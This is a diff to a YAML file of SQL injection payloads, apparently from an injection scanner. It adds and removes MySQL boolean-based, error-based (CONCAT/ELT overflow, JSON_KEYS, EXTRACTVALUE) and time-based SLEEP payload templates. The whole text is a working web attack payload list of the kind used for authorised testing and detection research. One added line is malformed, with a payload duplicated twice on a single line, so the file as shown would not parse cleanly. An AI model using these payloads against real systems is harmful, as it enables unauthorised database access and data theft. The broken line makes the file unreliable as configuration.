@@ -9,8 +9,10 @@ payloads:
                 - " OR '[fix_num]'='[fix_num]''[comment]'"
                 - " OR NOT '[fix_num]'='[rand_num]''[comment]'"
   error_based:
-                - " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
+                - " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"                                - " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
+                - " AND NOT (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
                 - " OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
+                - " OR NOT (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
                 - " AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]')) USING utf8)))"
                 - " OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]')) USING utf8)))"
                 - " AND EXTRACTVALUE('[rand_num]']',CONCAT('\','[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]'))"
@@ -31,8 +33,3 @@ payloads:
                 - " '[low_level_rand_num]'"
                 - " AND SLEEP('[low_level_rand_num]')'[comment]'"
                 - " OR SLEEP('[low_level_rand_num]')'[comment]'"
-  expiremental_payloads:
-                - " AND SLEEP('[low_level_rand_num]') AND '[fix_num]'='[rand_num]' OR NOT '[fix_num]'='[rand_num]''[comment]'"
-                - " OR NOT '[fix_num]'='[rand_num]' AND '[fix_num]'='[rand_num]' OR '[fix_num]'='[rand_num]'"
-                - " '[comment]' AND '[fix_num]'='[fix_num]' SLEEP('[low_level_rand_num]')"
-                - " SLEEP('[low_level_rand_num]') SLEEP('[low_level_rand_num]') SLEEP('[low_level_rand_num]') AND '[fix_num]'='[fix_num]'"
